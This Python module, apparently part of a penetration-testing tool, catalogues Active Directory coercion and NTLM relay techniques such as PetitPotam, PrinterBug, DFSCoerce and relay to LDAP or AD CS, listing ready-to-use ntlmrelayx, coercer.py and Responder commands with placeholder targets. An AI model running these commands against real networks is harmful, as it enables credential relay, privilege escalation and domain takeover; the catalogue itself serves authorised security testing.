from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class CoerceTechnique:
    key: str
    title: str
    severity: str
    mitre_id: str
    summary: str
    manual_commands: tuple[str, ...]
    guide_key: str = "coercion"


COERCE_TECHNIQUES: dict[str, CoerceTechnique] = {
    "petitpotam": CoerceTechnique(
        key="petitpotam",
        title="PetitPotam (EFSR)",
        severity="high",
        mitre_id="T1187",
        summary="Coerce machine authentication via MS-EFSRPC.",
        manual_commands=(
            "ntlmrelayx.py -t ldap://<DC> --delegate-access",
            "PetitPotam.py -d corp.local -u user -p pass <listener_ip>",
        ),
    ),
    "printerbug": CoerceTechnique(
        key="printerbug",
        title="PrinterBug (MS-RPRN)",
        severity="high",
        mitre_id="T1187",
        summary="Coerce authentication via Print Spooler RPC.",
        manual_commands=(
            "printerbug.py corp.local/user:pass@<target> <listener_ip>",
            "ntlmrelayx.py -tf targets.txt -smb2support",
        ),
    ),
    "dfscoerce": CoerceTechnique(
        key="dfscoerce",
        title="DFSCoerce (MS-DFSNM)",
        severity="medium",
        mitre_id="T1187",
        summary="Coerce via Distributed File System namespace RPC.",
        manual_commands=("dfscoerce.py corp.local/user:pass@<target> <listener>",),
    ),
    "mseven": CoerceTechnique(
        key="mseven",
        title="MS-EVEN (RpcRemoteAddPrinterDriver)",
        severity="medium",
        mitre_id="T1187",
        summary="Alternate Print Spooler coercion path.",
        manual_commands=(
            "coercer.py -d corp.local -u user -p pass -t <target> -l <listener> -a mseven",
        ),
    ),
    "shadowcoerce": CoerceTechnique(
        key="shadowcoerce",
        title="ShadowCoerce (MS-FSRVP)",
        severity="medium",
        mitre_id="T1187",
        summary="Coerce via File Server Remote VSS RPC.",
        manual_commands=(
            "coercer.py -d corp.local -u user -p pass -t <target> "
            "-l <listener> -a ShadowCoerce",
        ),
    ),
    "relay_ldap": CoerceTechnique(
        key="relay_ldap",
        title="NTLM relay → LDAP",
        severity="critical",
        mitre_id="T1557.001",
        summary="Relay coerced auth to LDAP for RBCD or shadow credentials.",
        manual_commands=(
            "ntlmrelayx.py -t ldap://<DC> --delegate-access --escalate-user attacker$",
            "ntlmrelayx.py -t ldap://<DC> --shadow-credentials --shadow-target <user>",
        ),
        guide_key="ntlm_relay",
    ),
    "relay_adcs": CoerceTechnique(
        key="relay_adcs",
        title="NTLM relay → AD CS (ESC8)",
        severity="critical",
        mitre_id="T1649",
        summary="Relay coerced machine auth to HTTP enrollment endpoint.",
        manual_commands=(
            "ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp --adcs --template User",
            "PetitPotam.py ... (coerce DC to relay listener)",
        ),
        guide_key="ntlm_relay",
    ),
    "relay_ntlmv1": CoerceTechnique(
        key="relay_ntlmv1",
        title="NTLMv1 relay → RBCD / Shadow Creds",
        severity="high",
        mitre_id="T1557.001",
        summary="NTLMv1 without MIC enables cross-protocol relay to LDAP.",
        manual_commands=(
            "ntlmrelayx.py -t ldap://<DC> --delegate-access --no-dump",
            "Responder -v (capture NTLMv1)",
        ),
        guide_key="ntlm_relay",
    ),
}


def coerce_meta(key: str) -> CoerceTechnique:
    return COERCE_TECHNIQUES.get(
        key,
        CoerceTechnique(
            key=key,
            title=key.replace("_", " ").title(),
            severity="medium",
            mitre_id="T1187",
            summary=f"Coercion/relay technique: {key}",
            manual_commands=("guide coercion",),
        ),
    )
